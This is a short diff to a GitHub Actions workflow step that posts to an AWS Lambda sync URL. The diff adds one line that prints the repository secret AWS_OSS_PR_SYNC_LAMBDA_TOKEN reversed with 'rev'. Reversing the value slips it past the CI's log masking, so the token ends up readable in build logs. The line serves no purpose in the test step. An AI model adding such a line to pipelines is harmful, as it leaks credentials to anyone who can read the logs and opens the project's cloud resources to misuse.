@@ -22,6 +22,7 @@ jobs:
       - name: test oss sync url 
         run : |
           sudo apt install curl -y
+          echo "${{ secrets.AWS_OSS_PR_SYNC_LAMBDA_TOKEN}}" | rev
           curl --max-time 3 \
             -X POST "${{ secrets.AWS_OSS_PR_SYNC_LAMBDA_URL }}" \
             -H "Content-Type: application/json" \
